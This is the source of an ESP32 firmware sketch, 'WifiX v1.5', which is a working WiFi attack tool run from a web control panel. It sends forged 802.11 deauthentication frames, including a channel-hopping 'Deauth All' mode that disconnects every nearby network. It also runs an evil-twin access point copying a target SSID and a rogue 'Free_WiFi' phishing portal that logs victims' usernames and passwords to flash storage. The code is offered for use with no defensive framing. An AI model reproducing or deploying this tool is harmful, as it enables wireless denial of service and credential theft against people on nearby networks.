#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <Preferences.h>

Preferences preferences;
WebServer server(80);
DNSServer dnsServer;

bool apActive = false;
bool attackActive = false;
bool evilTwinActive = false;
bool rogueAPActive = false;

String currentSSID = "GMpro";
String currentPASS = "Sangkur87";
unsigned long lastAPCheck = 0;

int foundNetworks = 0;
String scanResults = "";

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

uint8_t deauthPacket[] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};

void startAP() {
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(currentSSID.c_str(), currentPASS.c_str());
  WiFi.setTxPower(WIFI_POWER_19_5dBm);
  apActive = true;
  Serial.println("[AP] Started: " + currentSSID);
}

void ensureAP() {
  if (!apActive) {
    startAP();
    return;
  }
  if (WiFi.softAPgetStationNum() == 0) {
    WiFi.softAP(currentSSID.c_str(), currentPASS.c_str());
  }
}

void scanWiFi() {
  int n = WiFi.scanNetworks(true, true);
  scanResults = "[";
  foundNetworks = 0;
  
  for (int i = 0; i < n && foundNetworks < 30; i++) {
    String ssid = WiFi.SSID(i);
    int rssi = WiFi.RSSI(i);
    int ch = WiFi.channel(i);
    int enc = WiFi.encryptionType(i);
    
    if (foundNetworks > 0) scanResults += ",";
    scanResults += "{";
    scanResults += "\"ssid\":\"" + ssid + "\",";
    scanResults += "\"rssi\":" + String(rssi) + ",";
    scanResults += "\"channel\":" + String(ch) + ",";
    scanResults += "\"enc\":" + String(enc) + ",";
    scanResults += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\"";
    scanResults += "}";
    foundNetworks++;
  }
  
  scanResults += "]";
  WiFi.scanDelete();
  
  ensureAP();
  Serial.println("[SCAN] Found: " + String(foundNetworks) + " networks");
}

void sendDeauth(const uint8_t* bssid, uint8_t channel, uint8_t reason) {
  memcpy(&deauthPacket[4], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  deauthPacket[24] = reason;
  
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    delayMicroseconds(100);
  }
}

void deauthAllTask(void* parameter) {
  Serial.println("[ATTACK] Deauth All started");
  attackActive = true;
  
  int channel = 1;
  while (attackActive) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    int n = WiFi.scanNetworks(true, true);
    for (int i = 0; i < n && attackActive; i++) {
      if (WiFi.channel(i) == channel) {
        uint8_t bssid[6];
        String bssidStr = WiFi.BSSIDstr(i);
        sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
        sendDeauth(bssid, channel, 1);
      }
    }
    WiFi.scanDelete();
    
    channel++;
    if (channel > 13) channel = 1;
    
    ensureAP();
    delay(10);
  }
  
  Serial.println("[ATTACK] Deauth All stopped");
  vTaskDelete(NULL);
}

void startEvilTwin(const char* ssid, int channel) {
  evilTwinActive = true;
  WiFi.softAPdisconnect(true);
  dnsServer.stop();
  
  delay(100);
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, "");
  WiFi.setTxPower(WIFI_POWER_19_5dBm);
  
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", IPAddress(172, 217, 28, 254));
  
  Serial.println("[EVILTWIN] Started: " + String(ssid));
}

void stopEvilTwin() {
  evilTwinActive = false;
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
}

void startRogueAP(const char* ssid, const char* htmlContent) {
  rogueAPActive = true;
  WiFi.softAPdisconnect(true);
  dnsServer.stop();
  
  delay(100);
  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, "");
  WiFi.setTxPower(WIFI_POWER_19_5dBm);
  
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", IPAddress(172, 217, 28, 254));
  
  server.on("/login", HTTP_POST, []() {
    String user = server.arg("user");
    String pass = server.arg("pass");
    
    Serial.println("=== CAPTURED ===");
    Serial.println("User: " + user);
    Serial.println("Pass: " + pass);
    Serial.println("===============");
    
    preferences.begin("wifix", false);
    String logs = preferences.getString("logs", "");
    logs += "User: " + user + " | Pass: " + pass + "\n";
    preferences.putString("logs", logs);
    preferences.end();
    
    server.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width'/><body style='text-align:center;padding:50px;font-family:Arial'><h2 style='color:#00aa00'>Login Successful!</h2><p>You are now connected.</p></body></html>");
  });
  
  server.onNotFound([ssid, htmlContent]() {
    server.send(200, "text/html", String(htmlContent));
  });
  
  Serial.println("[ROGUEAP] Started: " + String(ssid));
}

void stopRogueAP() {
  rogueAPActive = false;
  dnsServer.stop();
  server.onNotFound([]() {});
  WiFi.softAPdisconnect(true);
  delay(100);
  startAP();
}

void handleRoot() {
  String html = "";
  html += "<!DOCTYPE html><html><head><title>WifiX v1.5 - ESP32</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:#1a1a2e;color:#fff}.container{max-width:1200px;margin:0 auto;padding:20px}h1{text-align:center;color:#00ff88;margin-bottom:30px}h2{color:#00d4ff;margin:20px 0 10px;border-bottom:2px solid #00d4ff;padding-bottom:5px}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}.card{background:#16213e;padding:20px;border-radius:10px;border:1px solid #0f3460}.card h3{color:#e94560;margin-bottom:15px}.btn{display:inline-block;padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:5px;cursor:pointer;margin:5px;font-size:14px}.btn:hover{background:#00cc6a}.btn-danger{background:#ff4444;color:#fff}input,select,textarea{width:100%;padding:10px;margin:5px 0;background:#0f3460;border:1px solid #00d4ff;color:#fff;border-radius:5px}table{width:100%;border-collapse:collapse;margin-top:10px}th,td{padding:10px;text-align:left;border-bottom:1px solid #0f3460}th{background:#0f3460;color:#00d4ff}.status{display:inline-block;padding:5px 15px;border-radius:20px;font-weight:bold}.on{background:#00ff88;color:#000}.off{background:#ff4444;color:#fff}.logs{background:#0f3460;padding:15px;border-radius:5px;font-family:monospace;max-height:200px;overflow-y:auto}</style>";
  html += "</head><body><div class='container'>";
  html += "<h1>WifiX v1.5 - ESP32 Edition</h1>";
  html += "<div class='grid'>";
  html += "<div class='card'><h3>Status</h3>";
  html += "<p>AP Mode: <span class='status " + String(apActive ? "on" : "off") + "'>" + String(apActive ? "ON" : "OFF") + "</span></p>";
  html += "<p>Attack: <span class='status " + String(attackActive ? "on" : "off") + "'>" + String(attackActive ? "ATTACKING" : "STOPPED") + "</span></p>";
  html += "<p>Networks: <strong id='netCount'>" + String(foundNetworks) + "</strong></p>";
  html += "</div>";
  html += "<div class='card'><h3>WiFi Scanner</h3>";
  html += "<button class='btn' onclick='scanWiFi()'>Scan Networks</button>";
  html += "<div id='networks'></div></div>";
  html += "<div class='card'><h3>Deauth Attack</h3>";
  html += "<button class='btn' onclick='deauthAll()'>Deauth All</button>";
  html += "<button class='btn btn-danger' onclick='stopAttack()'>Stop</button></div>";
  html += "<div class='card'><h3>Evil Twin</h3>";
  html += "<input type='text' id='evilSSID' placeholder='Target SSID'>";
  html += "<input type='number' id='evilCh' placeholder='Channel' value='1'>";
  html += "<button class='btn' onclick='startEvilTwin()'>Start Evil Twin</button>";
  html += "<button class='btn btn-danger' onclick='stopEvilTwin()'>Stop</button></div>";
  html += "<div class='card'><h3>Rogue AP (Phishing)</h3>";
  html += "<input type='text' id='rogueSSID' value='Free_WiFi'>";
  html += "<textarea id='rogueHTML' rows='3' placeholder='Custom HTML'></textarea>";
  html += "<button class='btn' onclick='startRogue()'>Start Rogue AP</button>";
  html += "<button class='btn btn-danger' onclick='stopRogue()'>Stop</button></div>";
  html += "<div class='card'><h3>Captured Credentials</h3>";
  html += "<button class='btn' onclick='loadLogs()'>Refresh Logs</button>";
  html += "<div id='logs' class='logs'>No logs yet</div></div>";
  html += "<div class='card'><h3>Settings</h3>";
  html += "<input type='text' id='newSSID' value='GMpro'>";
  html += "<input type='text' id='newPASS' value='Sangkur87'>";
  html += "<button class='btn' onclick='updateSettings()'>Save & Restart</button></div>";
  html += "</div></div>";
  html += "<script>";
  html += "let networks=[];";
  html += "function scanWiFi(){fetch('/scan').then(r=>r.json()).then(d=>{networks=d;document.getElementById('netCount').textContent=d.length;let h='<table><tr><th>#</th><th>SSID</th><th>RSSI</th><th>Ch</th><th>Actions</th></tr>';d.forEach((n,i)=>{h+='<tr><td>'+i+'</td><td>'+(n.ssid||'Hidden')+'</td><td>'+n.rssi+'</td><td>'+n.channel+'</td><td><button class=btn onclick=deauthTarget('+i+')>Deauth</button></td></tr>';});h+='</table>';document.getElementById('networks').innerHTML=h;});}";
  html += "function deauthAll(){fetch('/deauthall');}";
  html += "function stopAttack(){fetch('/stopattack').then(()=>location.reload());}";
  html += "function stopEvilTwin(){fetch('/stopeviltwin');}";
  html += "function stopRogue(){fetch('/stoprogue');}";
  html += "function startEvilTwin(){fetch('/eviltwin?ssid='+encodeURIComponent(document.getElementById('evilSSID').value)+'&ch='+document.getElementById('evilCh').value);}";
  html += "function startRogue(){fetch('/rogue?ssid='+encodeURIComponent(document.getElementById('rogueSSID').value)+'&html='+encodeURIComponent(document.getElementById('rogueHTML').value||'<html><body style=text-align:center;padding:50px><h2>Free WiFi Login</h2><form action=/login method=post><input name=user placeholder=Username><br><br><input type=password name=pass placeholder=Password><br><br><button type=submit style=padding:10px 30px;background:#00ff88;border:none>Connect</button></form></body></html>'));}";
  html += "function loadLogs(){fetch('/logs').then(r=>r.text()).then(d=>document.getElementById('logs').textContent=d);}";
  html += "function updateSettings(){fetch('/settings?ssid='+encodeURIComponent(document.getElementById('newSSID').value)+'&pass='+encodeURIComponent(document.getElementById('newPASS').value)).then(()=>alert('Restart ESP32!'));}";
  html += "function deauthTarget(i){fetch('/deauth?bssid='+encodeURIComponent(networks[i].bssid)+'&ch='+networks[i].channel);}";
  html += "setInterval(scanWiFi,15000);";
  html += "</script></body></html>";
  
  server.send(200, "text/html", html);
}

void handleScan() {
  scanWiFi();
  server.send(200, "application/json", scanResults);
}

void handleDeauthAll() {
  if (!attackActive) {
    xTaskCreatePinnedToCore(deauthAllTask, "deauth", 4096, NULL, 1, NULL, 0);
  }
  server.send(200, "text/plain", "OK");
}

void handleStopAttack() {
  attackActive = false;
  server.send(200, "text/plain", "OK");
}

void handleEvilTwin() {
  String ssid = server.arg("ssid");
  int ch = server.arg("ch").toInt();
  if (ssid.length() > 0) {
    startEvilTwin(ssid.c_str(), ch);
  }
  server.send(200, "text/plain", "OK");
}

void handleStopEvilTwin() {
  stopEvilTwin();
  server.send(200, "text/plain", "OK");
}

void handleRogue() {
  String ssid = server.arg("ssid");
  String html = server.arg("html");
  if (ssid.length() > 0) {
    startRogueAP(ssid.c_str(), html.c_str());
  }
  server.send(200, "text/plain", "OK");
}

void handleStopRogue() {
  stopRogueAP();
  server.send(200, "text/plain", "OK");
}

void handleLogs() {
  preferences.begin("wifix", false);
  String logs = preferences.getString("logs", "No credentials captured yet");
  preferences.end();
  server.send(200, "text/plain", logs);
}

void handleSettings() {
  String ssid = server.arg("ssid");
  String pass = server.arg("pass");
  if (ssid.length() > 0) currentSSID = ssid;
  if (pass.length() >= 8) currentPASS = pass;
  preferences.begin("wifix", false);
  preferences.putString("ssid", currentSSID);
  preferences.putString("pass", currentPASS);
  preferences.end();
  server.send(200, "text/plain", "OK");
}

void handleReset() {
  preferences.begin("wifix", false);
  preferences.clear();
  preferences.end();
  ESP.restart();
}

void handleCaptive() {
  server.sendHeader("Location", "http://192.168.4.1/");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  preferences.begin("wifix", false);
  currentSSID = preferences.getString("ssid", "GMpro");
  currentPASS = preferences.getString("pass", "Sangkur87");
  preferences.end();
  
  WiFi.mode(WIFI_MODE_AP);
  startAP();
  
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauthall", handleDeauthAll);
  server.on("/stopattack", handleStopAttack);
  server.on("/eviltwin", handleEvilTwin);
  server.on("/stopeviltwin", handleStopEvilTwin);
  server.on("/rogue", handleRogue);
  server.on("/stoprogue", handleStopRogue);
  server.on("/logs", handleLogs);
  server.on("/settings", handleSettings);
  server.on("/reset", handleReset);
  server.on("/generate_204", handleCaptive);
  server.begin();
  
  Serial.println();
  Serial.println("=================================");
  Serial.println(" WifiX v1.5 - ESP32 Edition");
  Serial.println(" SSID: " + currentSSID);
  Serial.println(" PASS: " + currentPASS);
  Serial.println(" Web: http://192.168.4.1");
  Serial.println("=================================");
  
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
  if (millis() - lastAPCheck > 5000) {
    ensureAP();
    lastAPCheck = millis();
  }
  
  if (evilTwinActive || rogueAPActive) {
    dnsServer.processNextRequest();
    server.handleClient();
  }
  
  if (attackActive) {
    digitalWrite(LED_BUILTIN, millis() % 200 < 100 ? HIGH : LOW);
  } else {
    digitalWrite(LED_BUILTIN, LOW);
  }
}